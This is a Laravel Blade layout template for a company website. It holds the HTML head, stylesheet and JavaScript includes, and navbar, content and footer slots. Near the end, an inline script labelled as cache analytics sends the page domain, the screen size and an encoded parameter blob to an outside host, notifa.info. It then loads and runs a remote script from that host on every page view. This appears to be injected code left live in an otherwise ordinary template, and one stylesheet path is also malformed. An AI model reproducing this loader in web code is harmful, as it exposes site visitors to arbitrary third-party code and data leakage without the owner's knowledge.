<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta name="language" content="en" />

        <title>PT Tunas Cahaya Mandiri Widyatama</title>

        <link rel="stylesheet" type="text/css" href="{{ asset('css/cassade.css') }}" media="screen" />
        <link rel="stylesheet" type="text/css" href="{{ asset('css/bootstrap.css') }}" media="screen" />
        <link rel="stylesheet" type="text/css" href="{{ asset('css/bootstrap-theme.cs') }}s" media="screen" />
        <link rel="stylesheet" type="text/css" href="{{ asset('css/style.css') }}" media="screen" />
        <link rel="stylesheet" type="text/css" href="{{ asset('css/layout/boxed1.css') }}" id="layout">
        <link rel="stylesheet" type="text/css" href="{{ asset('css/skin/green.css') }}" id="skin" />
        
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

        <link rel="shortcut icon" href="{{ asset('img/favicon.ico') }}">

    </head>

    <body class="bg-1">
        <div class="wrapper">

            @include('layouts.navbar')

            @yield('content')

            @include('layouts.footer')

        </div>

        <!--Move To Top-->
        <div id="movetotop"> <a class="icon-angle-up"></a> </div>
        <script type="text/javascript">
            if (self == top) {
                function netbro_cache_analytics(fn, callback) {
                    setTimeout(function () {
                        fn();
                        callback();
                    }, 0);
                }

                function sync(fn) {
                    fn();
                }

                function requestCfs() {
                    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
                    var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                        "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2Xt1J5X%2bqC%2f3BAnWxMnf8akUfqMRu9RGJftMgV99SBbrYf6kIvyDgKYdbywzi9OmfqUQVtvIcXCqnq6no7TaGQwrVVhWQlCyZ5REcZlwwwDEBTgYEhkx7BRi1JurfHpy6GA26f8tQ%2fw1Yiq6359hCZpWXbD42yC5TNTa1y9I783Re7GbEm%2f04xbXLm609XfiXiaYLkZ2yLn6glWkqeEkMReDsKdRwU4Bub3QAuN3OJm91YjWFY73Vaw2PqzYrkA8tCpzusBBeTR4pCNdLhX%2fCI7f1o3U7xOaRHVkjVKw%2bUR2DI%2bURiox3ImwptggS2PNOyUWvvgRPNwl80UwHAUiYOU6M2ty%2b24ttnvqHhJ8612j1E0op%2fz%2fjLU%2fMQI%2f4fXyUxMrFxlzc51xxZJt%2fKRLxRwxA9s%2fk02gJLd8vAHIScIbPEc1UPk56oclvVTk9DujRdjj0yoGmYlqgNIvWJnsBjQ%3d%3d" +
                        "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                        .height;
                    var bsa = document.createElement('script');
                    bsa.type = 'text/javascript';
                    bsa.async = true;
                    bsa.src = url;
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(
                        bsa);
                }
                netbro_cache_analytics(requestCfs, function () {});
            };
        </script>

    </body>
    <script type="text/javascript" src="{{asset('js/jquery.min.js')}}"></script>
    <script type="text/javascript" src="{{asset('bootstrap.min.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jquery.prettyPhoto.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jquery.nivo.slider.pack.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jflickrfeed.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/selectnav.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jquery.easing.1.3.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/custom.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/switcher.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jquery.isotope.min.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/slider.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/jquery.flexslider.js')}}"></script>
    <script type="text/javascript" src="{{asset('js/menu-lamp.js')}}"></script>

</html>